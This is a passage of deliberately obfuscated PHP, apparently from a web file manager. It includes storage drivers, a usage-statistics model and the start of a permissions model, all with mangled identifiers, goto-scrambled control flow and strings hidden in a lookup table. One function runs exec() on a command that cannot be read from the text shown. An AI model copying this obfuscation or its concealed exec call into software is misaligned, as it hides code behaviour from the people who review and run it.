fclose($CÊØˆäî Â); goto B¢¥ÓãÔºÀ; e°¶ƒŒÖ‡: $AÓ–¶Ìš‘ =& $_SERVER[…Ò×–]; $fã§¡šÀê = $this->iconvSystem($fã§¡šÀê); if ($aÓéœÀìÒ === !1) { $aÓéœÀìÒ = $this->size($fã§¡šÀê); } goto fÕ›ßÈ´¸Ì; A³·«º–ÛÊ: } public function upload($Aˆ¾”æáÄ, $eÖãå©–ÖÈ, $AÈšÚãõ¾õ = false, $EôÏš§¥¹¬ = REPEAT_REPLACE) { $dœö¹à…®º = $this->copyFile($eÖãå©–ÖÈ, $Aˆ¾”æáÄ); return $dœö¹à…®º ? $this->getPathOuter($Aˆ¾”æáÄ) : !1; } public function setModifyTime($BÃˆŞó¼³ó, $EÛ¢Öô®Œ« = '') { @touch($BÃˆŞó¼³ó, intval($EÛ¢Öô®Œ«)); } public function download($EÀ÷ô©ßñ, $fÕ¹™¨µàÃ) { return $this->iconvSystem($EÀ÷ô©ßñ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($aàçä°Õ…) { parent::__construct($aàçä°Õ…); $this->signatureVersion($_SERVER[…Ò×–][204]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($aö‘‘ŞöÜ) { parent::__construct($aö‘‘ŞöÜ); $this->signatureVersion($_SERVER[…Ò×–][204]); } public function fileOutLink($C˜†ó“‡¶Õ) { $B¥”‚³“‘ =& $_SERVER[…Ò×–]; if (substr($C˜†ó“‡¶Õ, 0, 7) == $B¥”‚³“‘[1125]) { $C˜†ó“‡¶Õ = $B¥”‚³“‘[1126] . substr($C˜†ó“‡¶Õ, 7); } header($B¥”‚³“‘[156] . $C˜†ó“‡¶Õ); die; } } goto F»¦‚æÌË¿; e‡ç·Šï®±: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($c¥¼ƒˆ…¼ì) { $eŸ¬¼ÀºÆÀ =& $_SERVER[…Ò×–]; $B³ÎÛ‘ò» = array($eŸ¬¼ÀºÆÀ[539] => array($eŸ¬¼ÀºÆÀ[29] => $eŸ¬¼ÀºÆÀ[2044], $eŸ¬¼ÀºÆÀ[265] => array($eŸ¬¼ÀºÆÀ[214], $eŸ¬¼ÀºÆÀ[705], $eŸ¬¼ÀºÆÀ[2045], $eŸ¬¼ÀºÆÀ[2046])), $eŸ¬¼ÀºÆÀ[2047] => array($eŸ¬¼ÀºÆÀ[29] => $eŸ¬¼ÀºÆÀ[2048], $eŸ¬¼ÀºÆÀ[265] => array($eŸ¬¼ÀºÆÀ[214], $eŸ¬¼ÀºÆÀ[703], $eŸ¬¼ÀºÆÀ[2049], $eŸ¬¼ÀºÆÀ[2050], $eŸ¬¼ÀºÆÀ[2051]))); if (!isset($B³ÎÛ‘ò»[$c¥¼ƒˆ…¼ì])) { return !1; } $this->optionType = $B³ÎÛ‘ò»[$c¥¼ƒˆ…¼ì][$eŸ¬¼ÀºÆÀ[29]]; $this->field = $B³ÎÛ‘ò»[$c¥¼ƒˆ…¼ì][$eŸ¬¼ÀºÆÀ[265]]; return !0; } public function listData($a‘‡Ê¹Ôø‡ = false, $cõ£†¥ƒå = "\x6d\x6f\144\151\x66\x79\124\x69\x6d\145", $EŠå«É‰·Ö = false) { return parent::listData($a‘‡Ê¹Ôø‡, $cõ£†¥ƒå, $EŠå«É‰·Ö); } public function trendList($FããˆÔ¤ñ) { goto E­ëŠß“àÕ; CñŒ¶í”øš: foreach ($Bœ–ÀÈğ­Í as $A¦Ê©‡·î) { $this->{$c»Ş´•äÊƒ}($A¦Ê©‡·î); } return $this->listData(); goto E¬ŒØïŠÔ; C­Í‚ßÜ¼’: if (!isset($DÃìÒ½×â)) { $dëÁÄšŠãÇ = $FããˆÔ¤ñ == $d‹¥Ê£®Óï[539] ? $d‹¥Ê£®Óï[482] : $d‹¥Ê£®Óï[757]; $DÃìÒ½×â = Model($dëÁÄšŠãÇ)->min($d‹¥Ê£®Óï[191]); } $c»Ş´•äÊƒ = $d‹¥Ê£®Óï[2054] . ucfirst($FããˆÔ¤ñ); $Bœ–ÀÈğ­Í = $this->dateList($DÃìÒ½×â); goto CñŒ¶í”øš; E­ëŠß“àÕ: $d‹¥Ê£®Óï =& $_SERVER[…Ò×–]; $Bº¨¬Š ™ê = $this->listData(); if ($Bº¨¬Š ™ê) { $B‡ĞÔÜ†ç = end($Bº¨¬Š ™ê); $A¦Ê©‡·î = date($d‹¥Ê£®Óï[2052], strtotime($d‹¥Ê£®Óï[2053])); if ($B‡ĞÔÜ†ç[$d‹¥Ê£®Óï[214]] == $A¦Ê©‡·î) { return $Bº¨¬Š ™ê; } $DÃìÒ½×â = strtotime($B‡ĞÔÜ†ç[$d‹¥Ê£®Óï[214]]); } goto C­Í‚ßÜ¼’; E¬ŒØïŠÔ: } private function dateList($c¥œªÖì±Á) { $Eã‡å­œ›Ğ =& $_SERVER[…Ò×–]; $BÓŠò¬»ä† = $c¥œªÖì±Á; $D›†¹•ÖÌ = strtotime($Eã‡å­œ›Ğ[2053]); $EßÑˆß»ƒ = array(); while ($BÓŠò¬»ä† <= $D›†¹•ÖÌ) { $EßÑˆß»ƒ[] = date($Eã‡å­œ›Ğ[2052], $BÓŠò¬»ä†); $BÓŠò¬»ä† = strtotime($Eã‡å­œ›Ğ[2055], $BÓŠò¬»ä†); } return $EßÑˆß»ƒ; } public function _recordUser($A÷ß´®Ú§„ = '') { goto døç¤éö”Å; døç¤éö”Å: $B¹œèôª† =& $_SERVER[…Ò×–]; $A·¼œ‚µöá = strtotime(date($B¹œèôª†[2056], strtotime($A÷ß´®Ú§„))); $bô°Ù’È‰ˆ = strtotime(date($B¹œèôª†[2057], strtotime($A÷ß´®Ú§„))); goto EÑ’Œ„ÚŠ²; DĞëˆ”Õƒ: $c‚»…‘‘ßÖ = array($B¹œèôª†[214] => $A÷ß´®Ú§„, $B¹œèôª†[705] => (int) $b²âÌÑø, $B¹œèôª†[2045] => (int) $bÍî«òˆ¢, $B¹œèôª†[2046] => (int) $eõÅ©‹ùê); return $this->insert($c‚»…‘‘ßÖ); goto EÁ¢²÷İé; EÑ’Œ„ÚŠ²: $B×ğºìŒõÄ = array($B¹œèôª†[191] => array($B¹œèôª†[933], $bô°Ù’È‰ˆ)); $b²âÌÑø = Model($B¹œèôª†[482])->where($B×ğºìŒõÄ)->count($B¹œèôª†[1450]); $B×ğºìŒõÄ[$B¹œèôª†[191]] = array($B¹œèôª†[325], array($A·¼œ‚µöá, $bô°Ù’È‰ˆ)); goto fÚÅ°ÁÊÇ; fÚÅ°ÁÊÇ: $bÍî«òˆ¢ = Model($B¹œèôª†[482])->where($B×ğºìŒõÄ)->count($B¹œèôª†[1450]); $B×ğºìŒõÄ[$B¹œèôª†[29]] = $B¹œèôª†[2058]; $eõÅ©‹ùê = Model($B¹œèôª†[2059])->where($B×ğºìŒõÄ)->count($B¹œèôª†[2060]); goto DĞëˆ”Õƒ; EÁ¢²÷İé: } public function _recordStore($E›©²‡˜ = '') { goto FÏï†´„ˆç; FÏï†´„ˆç: $e¼Ë±ò…¦ =& $_SERVER[…Ò×–]; $ešÀÅ’Ø¶Ü = strtotime(date($e¼Ë±ò…¦[2057], strtotime($E›©²‡˜))); $cí¿¤±™ñĞ = array($e¼Ë±ò…¦[191] => array($e¼Ë±ò…¦[933], $ešÀÅ’Ø¶Ü)); goto A‡¶ŞøÏ; A‡¶ŞøÏ: $BŸéé–¸®œ = Model($e¼Ë±ò…¦[426])->where($cí¿¤±™ñĞ)->sum($e¼Ë±ò…¦[77]); $cí¿¤±™ñĞ[$e¼Ë±ò…¦[374]] = 0; $Aæ¤ª²Šà = Model($e¼Ë±ò…¦[757])->where($cí¿¤±™ñĞ)->sum($e¼Ë±ò…¦[77]); goto b‹é×÷•Ğ; DºØÌˆŸÓ²: $eçù«ùá· = Model($e¼Ë±ò…¦[757])->where($cí¿¤±™ñĞ)->sum($e¼Ë±ò…¦[77]); $e’·—ã¤¶é = array($e¼Ë±ò…¦[214] => $E›©²‡˜, $e¼Ë±ò…¦[703] => (int) $Aæ¤ª²Šà, $e¼Ë±ò…¦[2049] => (int) $BŸéé–¸®œ, $e¼Ë±ò…¦[2050] => (int) $FéŒ¿‹ß•Ö, $e¼Ë±ò…¦[2051] => (int) $eçù«ùá·); return $this->insert($e’·—ã¤¶é); goto fæ‹Ó«ä; b‹é×÷•Ğ: $cí¿¤±™ñĞ[$e¼Ë±ò…¦[375]] = 1; $FéŒ¿‹ß•Ö = Model($e¼Ë±ò…¦[757])->where($cí¿¤±™ñĞ)->sum($e¼Ë±ò…¦[77]); $cí¿¤±™ñĞ[$e¼Ë±ò…¦[375]] = 2; goto DºØÌˆŸÓ²; fæ‹Ó«ä: } public function trend($aÈÉÒ®‡±¶, $eÕˆÀèÍ) { goto D£Ã‡¥—”é; DĞñßŠñÌ: if (empty($a°‰¿…©â‰)) { $b¦½‚³ñâ = date($e¯š§Ò”¼á[2052], strtotime($e¯š§Ò”¼á[2053])); $CƒâôòƒĞ = array($e¯š§Ò”¼á[214] => $b¦½‚³ñâ); foreach ($DÊàÅ‚Îã[$aÈÉÒ®‡±¶] as $f¡âï¯ëÃ => $Díì°®êˆœ) { $CƒâôòƒĞ[$f¡âï¯ëÃ] = 0; } $a°‰¿…©â‰[] = $CƒâôòƒĞ; } $c¨µôöà· = array(); foreach ($a°‰¿…©â‰ as $Díì°®êˆœ) { if ($aÈÉÒ®‡±¶ == $e¯š§Ò”¼á[2047] && $Díì°®êˆœ[$e¯š§Ò”¼á[2049]] > $Díì°®êˆœ[$e¯š§Ò”¼á[703]]) { $Díì°®êˆœ[$e¯š§Ò”¼á[2049]] = $Díì°®êˆœ[$e¯š§Ò”¼á[703]]; } foreach ($DÊàÅ‚Îã[$aÈÉÒ®‡±¶] as $f¡âï¯ëÃ => $E ÍÑÂ¶‘) { $Cƒçë½Ö‚ = array($e¯š§Ò”¼á[214] => $Díì°®êˆœ[$e¯š§Ò”¼á[214]], $e¯š§Ò”¼á[1354] => $E ÍÑÂ¶‘); $Cƒçë½Ö‚[$C‚ª£Ø‘¿ˆ[$aÈÉÒ®‡±¶]] = isset($Díì°®êˆœ[$f¡âï¯ëÃ]) ? $Díì°®êˆœ[$f¡âï¯ëÃ] : 0; $c¨µôöà·[] = $Cƒçë½Ö‚; } } goto Fò”ï³Úº×; e…÷±êó•Ğ: if ($a°‰¿…©â‰ && $eÕˆÀèÍ != $e¯š§Ò”¼á[1425]) { $B¬‰ä…ÈØÁ = $a°‰¿…©â‰[0][$e¯š§Ò”¼á[214]]; $D™»Æˆ±¡ = $this->validDate($eÕˆÀèÍ, $B¬‰ä…ÈØÁ); $dÃĞ³ƒ°å = array(); $fƒ‰î¨ç¬© = array_to_keyvalue($a°‰¿…©â‰, $e¯š§Ò”¼á[214]); foreach ($D™»Æˆ±¡ as $b¦½‚³ñâ) { if (isset($fƒ‰î¨ç¬©[$b¦½‚³ñâ])) { $Cƒçë½Ö‚ = $fƒ‰î¨ç¬©[$b¦½‚³ñâ]; } else { $Cƒçë½Ö‚ = end($a°‰¿…©â‰); $Cƒçë½Ö‚[$e¯š§Ò”¼á[214]] = $b¦½‚³ñâ; if ($aÈÉÒ®‡±¶ == $e¯š§Ò”¼á[539]) { $Cƒçë½Ö‚[$e¯š§Ò”¼á[2045]] = $Cƒçë½Ö‚[$e¯š§Ò”¼á[2046]] = 0; } } $dÃĞ³ƒ°å[] = $Cƒçë½Ö‚; } $a°‰¿…©â‰ = $dÃĞ³ƒ°å; } $DÊàÅ‚Îã = array($e¯š§Ò”¼á[539] => array($e¯š§Ò”¼á[705] => LNG($e¯š§Ò”¼á[2061]), $e¯š§Ò”¼á[2045] => LNG($e¯š§Ò”¼á[2062]), $e¯š§Ò”¼á[2046] => LNG($e¯š§Ò”¼á[2063])), $e¯š§Ò”¼á[2047] => array($e¯š§Ò”¼á[703] => LNG($e¯š§Ò”¼á[2064]), $e¯š§Ò”¼á[2049] => LNG($e¯š§Ò”¼á[2065]), $e¯š§Ò”¼á[2050] => LNG($e¯š§Ò”¼á[2066]), $e¯š§Ò”¼á[2051] => LNG($e¯š§Ò”¼á[2067]))); $C‚ª£Ø‘¿ˆ = array($e¯š§Ò”¼á[539] => $e¯š§Ò”¼á[2068], $e¯š§Ò”¼á[2047] => $e¯š§Ò”¼á[77]); goto DĞñßŠñÌ; Fò”ï³Úº×: return $c¨µôöà·; goto A´¬ØÙÖÎ; D£Ã‡¥—”é: $e¯š§Ò”¼á =& $_SERVER[…Ò×–]; if (!$this->init($aÈÉÒ®‡±¶)) { return !1; } $a°‰¿…©â‰ = $this->trendList($aÈÉÒ®‡±¶); goto e…÷±êó•Ğ; A´¬ØÙÖÎ: } public function validDate($c¼¯¯‹‘, $FêèØµˆ«È) { goto CÃ²–›ˆáİ; CÃ²–›ˆáİ: $Bâ‹»ãí­ =& $_SERVER[…Ò×–]; $Dòß•ª‡ù = date($Bâ‹»ãí­[2052], strtotime($Bâ‹»ãí­[2053])); $Dãí–Ì‰”Ä = array($Dòß•ª‡ù); goto fÂ«©±»ö§; Bà®È„ÆãÇ: return $Dãí–Ì‰”Ä; goto e—Ä®•Ñ’; fÂ«©±»ö§: switch ($c¼¯¯‹‘) { case $Bâ‹»ãí­[1432]: $eË¨“’İÙ = mktime(0, 0, 0, date($Bâ‹»ãí­[2069]), date($Bâ‹»ãí­[2070]) - date($Bâ‹»ãí­[1238]) + 7 - 7, date($Bâ‹»ãí­[2071])); $bŠí²ê„² = 0; do { $f„¡£ì˜Œ = date($Bâ‹»ãí­[2052], $eË¨“’İÙ - 3600 * 24 * 7 * $bŠí²ê„²); $Dãí–Ì‰”Ä[] = $f„¡£ì˜Œ; $bŠí²ê„²++; } while ($FêèØµˆ«È < $f„¡£ì˜Œ); break; case $Bâ‹»ãí­[1430]: $bŠí²ê„² = 1; do { $d†Æî«ˆ‘ï = date($Bâ‹»ãí­[2072], strtotime("\x2d\40{$bŠí²ê„²}\x20\x6d\x6f\x6e\164\150\x73")); $Dãí–Ì‰”Ä[] = $d†Æî«ˆ‘ï; $bŠí²ê„²++; } while ($FêèØµˆ«È < $d†Æî«ˆ‘ï); break; case $Bâ‹»ãí­[1737]: $bÓ¡»…‡ø = (int) date($Bâ‹»ãí­[2071], strtotime($FêèØµˆ«È)); $eÜ‚”‡ÙŒ = (int) date($Bâ‹»ãí­[2071]); if ($bÓ¡»…‡ø >= $eÜ‚”‡ÙŒ) { break; } for ($bÓ¡»…‡ø; $bÓ¡»…‡ø < $eÜ‚”‡ÙŒ; $bÓ¡»…‡ø++) { $Dãí–Ì‰”Ä[] = $bÓ¡»…‡ø . $Bâ‹»ãí­[2073]; } break; default: break; } if ($FêèØµˆ«È > end($Dãí–Ì‰”Ä)) { array_pop($Dãí–Ì‰”Ä); } sort($Dãí–Ì‰”Ä); goto Bà®È„ÆãÇ; e—Ä®•Ñ’: } public function listTable($dÍÑÅ“») { $a‚†µ³½Î = ucfirst($dÍÑÅ“»); return Model($a‚†µ³½Î)->listData(); } public function option($a×Íù±ÌÒ) { $bšÈ…œ‡‹Ë = $_SERVER[…Ò×–][2074] . ucfirst($a×Íù±ÌÒ); return $this->{$bšÈ…œ‡‹Ë}(); } private function optionUser() { goto c—¿Ä‰ÒâÎ; E³ƒ·½ôÍ¥: if (!$F¶®£‰™ìÊ) { $F¶®£‰™ìÊ = 1; } $aÉ°äÚêà = strtotime(date($FË«¹İÔõ[2056])); $c©Ã’åÊ÷È = array($FË«¹İÔõ[2077] => array($FË«¹İÔõ[934], $aÉ°äÚêà)); goto D÷ÔßÒ†é´; c—¿Ä‰ÒâÎ: $FË«¹İÔõ =& $_SERVER[…Ò×–]; $fŠï‚¶ŒÒ = Model($FË«¹İÔõ[482])->count($FË«¹İÔõ[1450]); $AÆ†³¯ğ›Õ = Model($FË«¹İÔõ[482])->where($FË«¹İÔõ[2075])->count($FË«¹İÔõ[1450]); goto fö­Ô‘õšö; D÷ÔßÒ†é´: $c»°Í®¢³ = Model($FË«¹İÔõ[482])->where($c©Ã’åÊ÷È)->count($FË«¹İÔõ[1450]); return array($FË«¹İÔõ[700] => (int) $fŠï‚¶ŒÒ, $FË«¹İÔõ[2078] => (int) ($fŠï‚¶ŒÒ - $AÆ†³¯ğ›Õ), $FË«¹İÔõ[2079] => (int) $AÆ†³¯ğ›Õ, $FË«¹İÔõ[2080] => (int) $c»°Í®¢³, $FË«¹İÔõ[2081] => $F¶®£‰™ìÊ); goto B‡ŸÒœ„ùá; fö­Ô‘õšö: $aÉ°äÚêà = strtotime($FË«¹İÔõ[2076]); $c©Ã’åÊ÷È = array($FË«¹İÔõ[2077] => array($FË«¹İÔõ[934], $aÉ°äÚêà)); $F¶®£‰™ìÊ = (int) Model($FË«¹İÔõ[482])->where($c©Ã’åÊ÷È)->count($FË«¹İÔõ[1450]); goto E³ƒ·½ôÍ¥; B‡ŸÒœ„ùá: } private function optionFile() { goto c²¢§Óã£; C‹§ÑŒõÂ¹: $b•ÛÊçĞÙ = $cˆï¨±õîï[$bØ…ÉªáÕ[2049]]; $E¨À—òá– = Model($bØ…ÉªáÕ[757])->where(array($bØ…ÉªáÕ[374] => 0))->count($bØ…ÉªáÕ[373]); $bğ¾ŠŸ™äò = array($bØ…ÉªáÕ[374] => 0, $bØ…ÉªáÕ[191] => array($bØ…ÉªáÕ[934], strtotime(date($bØ…ÉªáÕ[2056])))); goto eÒñòÜ‰æÍ; c²¢§Óã£: $bØ…ÉªáÕ =& $_SERVER[…Ò×–]; $cˆï¨±õîï = $this->sourceSize(); $A†ÆƒŞ®‘ = $cˆï¨±õîï[$bØ…ÉªáÕ[77]]; goto C‹§ÑŒõÂ¹; eÒñòÜ‰æÍ: $DŠ˜õÔêù = Model($bØ…ÉªáÕ[757])->where($bğ¾ŠŸ™äò)->sum($bØ…ÉªáÕ[77]); $D‹‡™› = Model($bØ…ÉªáÕ[757])->where($bğ¾ŠŸ™äò)->count($bØ…ÉªáÕ[373]); return array($bØ…ÉªáÕ[703] => $A†ÆƒŞ®‘, $bØ…ÉªáÕ[2049] => $b•ÛÊçĞÙ, $bØ…ÉªáÕ[2082] => $A†ÆƒŞ®‘ - $b•ÛÊçĞÙ, $bØ…ÉªáÕ[2083] => (int) $DŠ˜õÔêù, $bØ…ÉªáÕ[705] => (int) $E¨À—òá–, $bØ…ÉªáÕ[2084] => (int) $D‹‡™›); goto c¦â¢İÑè›; c¦â¢İÑè›: } private function optionAccess() { $d¬ôù¤ò¡ù =& $_SERVER[…Ò×–]; return array($d¬ôù¤ò¡ù[700] => $this->typeLogCnt(), $d¬ôù¤ò¡ù[103] => $this->typeLogCnt($d¬ôù¤ò¡ù[103]), $d¬ôù¤ò¡ù[408] => $this->typeLogCnt($d¬ôù¤ò¡ù[408]), $d¬ôù¤ò¡ù[2085] => $this->typeLogCnt($d¬ôù¤ò¡ù[2085]), $d¬ôù¤ò¡ù[2086] => $this->typeLogCnt($d¬ôù¤ò¡ù[2086]), $d¬ôù¤ò¡ù[539] => $this->typeLogCnt($d¬ôù¤ò¡ù[33], $d¬ôù¤ò¡ù[2060])); } private function typeLogCnt($b‚„›ŞµŸ = '', $eâ†±Ì¡ë = "\151\x64") { goto AÀÚ™÷˜ÒÊ; Fè‘ÉàµãÕ: return (int) $c²Ñ´Ñ¨‹; goto Aô÷Ù•æÃ; D—Ù¯Ò³š³: $f¨›¤ÕÄ§¨ = array($Bå’ŒÒ™‹[191] => array($Bå’ŒÒ™‹[934], $EõŠÒ‘äÙÏ)); if ($b‚„›ŞµŸ) { $f¨›¤ÕÄ§¨[$Bå’ŒÒ™‹[29]] = array($Bå’ŒÒ™‹[7], $câ“¤”æ¢­[$b‚„›ŞµŸ]); } $c²Ñ´Ñ¨‹ = Model($Bå’ŒÒ™‹[2059])->where($f¨›¤ÕÄ§¨)->count($eâ†±Ì¡ë); goto Fè‘ÉàµãÕ; AÀÚ™÷˜ÒÊ: $Bå’ŒÒ™‹ =& $_SERVER[…Ò×–]; $câ“¤”æ¢­ = array($Bå’ŒÒ™‹[103] => array($Bå’ŒÒ™‹[2087], $Bå’ŒÒ™‹[2088]), $Bå’ŒÒ™‹[408] => array($Bå’ŒÒ™‹[2089], $Bå’ŒÒ™‹[2090]), $Bå’ŒÒ™‹[2085] => array($Bå’ŒÒ™‹[2091], $Bå’ŒÒ™‹[2092], $Bå’ŒÒ™‹[2093]), $Bå’ŒÒ™‹[2086] => array($Bå’ŒÒ™‹[2094], $Bå’ŒÒ™‹[2095]), $Bå’ŒÒ™‹[2096] => array($Bå’ŒÒ™‹[2097], $Bå’ŒÒ™‹[2098], $Bå’ŒÒ™‹[2099])); $EõŠÒ‘äÙÏ = strtotime(date($Bå’ŒÒ™‹[2056])); goto D—Ù¯Ò³š³; Aô÷Ù•æÃ: } private function optionServer() { goto dÕÇô‹ìÃæ; dÕÇô‹ìÃæ: $DÄÓÀï‚«’ =& $_SERVER[…Ò×–]; $f…ê¨‘©Ê = $this->diskDriver(); $fŞˆ–ëğò = KodIO::defaultDriver(); goto eø¸ÔÚøõ¼; eø¸ÔÚøõ¼: $e¿‰Âñ‡Ç¶ = array($DÄÓÀï‚«’[748] => $fŞˆ–ëğò[$DÄÓÀï‚«’[371]]); $dØ…‘Ï‰¿ = Model($DÄÓÀï‚«’[426])->where($e¿‰Âñ‡Ç¶)->sum($DÄÓÀï‚«’[77]); $f…›Á ÑåÄ = explode($DÄÓÀï‚«’[50], $_SERVER[$DÄÓÀï‚«’[139]]); goto A¿…İ¯¹Ÿ; A¿…İ¯¹Ÿ: $fé‡ÙŒá–° = $f…›Á ÑåÄ[0]; $døŸ‹Æµ‡ = $GLOBALS[$DÄÓÀï‚«’[6]][$DÄÓÀï‚«’[17]]; $EæÌå¬°âÙ = $døŸ‹Æµ‡[$DÄÓÀï‚«’[894]]; goto e¸‰¢¿Úó™; A‚ÇÊ‰•Í : return array($DÄÓÀï‚«’[2102] => $f…ê¨‘©Ê ? $f…ê¨‘©Ê[$DÄÓÀï‚«’[2103]] : 0, $DÄÓÀï‚«’[2104] => $f…ê¨‘©Ê ? $f…ê¨‘©Ê[$DÄÓÀï‚«’[2105]] : 0, $DÄÓÀï‚«’[2106] => (int) $fŞˆ–ëğò[$DÄÓÀï‚«’[2103]] * 1024 * 1024 * 1024, $DÄÓÀï‚«’[2107] => (int) $dØ…‘Ï‰¿, $DÄÓÀï‚«’[2108] => ucfirst($fé‡ÙŒá–°), $DÄÓÀï‚«’[2109] => $DÄÓÀï‚«’[2110] . PHP_VERSION, $DÄÓÀï‚«’[2111] => phpBuild64() ? 64 : 32, $DÄÓÀï‚«’[699] => str_replace($DÄÓÀï‚«’[2112], $DÄÓÀï‚«’[910], $EæÌå¬°âÙ), $DÄÓÀï‚«’[341] => ucfirst($c‘«åÒˆ·), $DÄÓÀï‚«’[28] => $_SERVER[$DÄÓÀï‚«’[2113]]); goto CÑôÑİÊô; e¸‰¢¿Úó™: if ($EæÌå¬°âÙ == $DÄÓÀï‚«’[728]) { $fåˆÇÒ°¬á = explode($DÄÓÀï‚«’[1086], $døŸ‹Æµ‡[$DÄÓÀï‚«’[893]]); $EæÌå¬°âÙ = $fåˆÇÒ°¬á[0]; } if ($EæÌå¬°âÙ == $DÄÓÀï‚«’[731] || $EæÌå¬°âÙ == $DÄÓÀï‚«’[732]) { $F‹µÍœçÇ = Model()->db()->query($DÄÓÀï‚«’[2100]); $d›è‚£Â°¹ = $F‹µÍœçÇ[0] && isset($F‹µÍœçÇ[0][$DÄÓÀï‚«’[1353]]) ? $F‹µÍœçÇ[0][$DÄÓÀï‚«’[1353]] : 0; $EæÌå¬°âÙ = $DÄÓÀï‚«’[2101] . ($d›è‚£Â°¹ ? $DÄÓÀï‚«’[8] . $d›è‚£Â°¹ : $DÄÓÀï‚«’[33]); } $c‘«åÒˆ· = $GLOBALS[$DÄÓÀï‚«’[6]][$DÄÓÀï‚«’[341]][$DÄÓÀï‚«’[759]]; goto A‚ÇÊ‰•Í ; CÑôÑİÊô: } private function diskDriver() { goto Fê¼†°ÉÄ‚; FáÎî‚»‹ó: if ($f«çÑøå·) { $cïêùĞè„â = $aÙ°¬ÈìÅ[2116]; if (function_exists($aÙ°¬ÈìÅ[2117])) { exec($aÙ°¬ÈìÅ[2118], $cïóŞéá©Ç); $cïêùĞè„â = $cïóŞéá©Ç[1] . $aÙ°¬ÈìÅ[8]; } } if (!file_exists($cïêùĞè„â)) { return; } $EÎôš¼ªàš = @disk_total_space($cïêùĞè„â); goto a±¡©àã›â; Fê¼†°ÉÄ‚: $aÙ°¬ÈìÅ =& $_SERVER[…Ò×–]; $cïêùĞè„â = $aÙ°¬ÈìÅ[8]; $f«çÑøå· = $GLOBALS[$aÙ°¬ÈìÅ[6]][$aÙ°¬ÈìÅ[2114]] == $aÙ°¬ÈìÅ[2115]; goto FáÎî‚»‹ó; a±¡©àã›â: $fÊŞ±ËÖ¿Ò = $EÎôš¼ªàš - @disk_free_space($cïêùĞè„â); return array($aÙ°¬ÈìÅ[2103] => $EÎôš¼ªàš, $aÙ°¬ÈìÅ[2105] => $fÊŞ±ËÖ¿Ò); goto e¶ËÔ¾ÑÍ¦; e¶ËÔ¾ÑÍ¦: } public function fileChart($f¦ÕÍï×äÚ) { goto CöÈ•˜¼ŸÎ; DÂ ÷•¥åÜ: $féßêèÖ« = $this->sourceSize(); $DæØãÎèõ’ = array($DŸĞæ“Ç¹Ó[466] => 0, $DŸĞæ“Ç¹Ó[375] => 1); $eòºæ’— = Model($DŸĞæ“Ç¹Ó[757])->where($DæØãÎèõ’)->sum($DŸĞæ“Ç¹Ó[77]); goto D«‚¶ÁĞæ§; D«‚¶ÁĞæ§: $DæØãÎèõ’[$DŸĞæ“Ç¹Ó[375]] = 2; $B«šóæ…æá = Model($DŸĞæ“Ç¹Ó[757])->where($DæØãÎèõ’)->sum($DŸĞæ“Ç¹Ó[77]); return array($DŸĞæ“Ç¹Ó[703] => $féßêèÖ«[$DŸĞæ“Ç¹Ó[77]], $DŸĞæ“Ç¹Ó[2049] => $féßêèÖ«[$DŸĞæ“Ç¹Ó[2049]], $DŸĞæ“Ç¹Ó[2050] => (int) $eòºæ’—, $DŸĞæ“Ç¹Ó[2051] => (int) $B«šóæ…æá); goto e‹É¨¿Ö±; CöÈ•˜¼ŸÎ: $DŸĞæ“Ç¹Ó =& $_SERVER[…Ò×–]; if (isset($f¦ÕÍï×äÚ[$DŸĞæ“Ç¹Ó[1450]])) { return Model($DŸĞæ“Ç¹Ó[757])->userFileTypeProfile($f¦ÕÍï×äÚ[$DŸĞæ“Ç¹Ó[1450]]); } if (isset($f¦ÕÍï×äÚ[$DŸĞæ“Ç¹Ó[2119]])) { return Model($DŸĞæ“Ç¹Ó[757])->groupFileTypeProfile($f¦ÕÍï×äÚ[$DŸĞæ“Ç¹Ó[2119]]); } goto DÂ ÷•¥åÜ; e‹É¨¿Ö±: } private function sourceSize() { $c‡‚Ò‹ˆ‹§ =& $_SERVER[…Ò×–]; $eäğ¡µÕÓƒ = Model($c‡‚Ò‹ˆ‹§[757])->where(array($c‡‚Ò‹ˆ‹§[374] => 0))->sum($c‡‚Ò‹ˆ‹§[77]); $DÒ”»ğÀì° = Model($c‡‚Ò‹ˆ‹§[426])->sum($c‡‚Ò‹ˆ‹§[77]); if ($DÒ”»ğÀì° > $eäğ¡µÕÓƒ) { $DÒ”»ğÀì° = $eäğ¡µÕÓƒ; } return array($c‡‚Ò‹ˆ‹§[77] => (int) $eäğ¡µÕÓƒ, $c‡‚Ò‹ˆ‹§[2049] => (int) $DÒ”»ğÀì°); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $DÒÉ”Œ•í =& $_SERVER[…Ò×–]; $bÆ‚ë©¯ = array(array($DÒÉ”Œ•í[390] => LNG($DÒÉ”Œ•í[2120]), $DÒÉ”Œ•í[2121] => $DÒÉ”Œ•í[2122], $DÒÉ”Œ•í[2123] => 1, $DÒÉ”Œ•í[2124] => 1, $DÒÉ”Œ•í[2125] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($DÒÉ”Œ•í[390] => LNG($DÒÉ”Œ•í[2126]), $DÒÉ”Œ•í[2121] => $DÒÉ”Œ•í[2127], $DÒÉ”Œ•í[2123] => 2, $DÒÉ”Œ•í[2124] => 1, $DÒÉ”Œ•í[2125] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($DÒÉ”Œ•í[390] => LNG($DÒÉ”Œ•í[2128]), $DÒÉ”Œ•í[2121] => $DÒÉ”Œ•í[2129], $DÒÉ”Œ•í[2123] => 3, $DÒÉ”Œ•í[2124] => 1, $DÒÉ”Œ•í[2125] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | 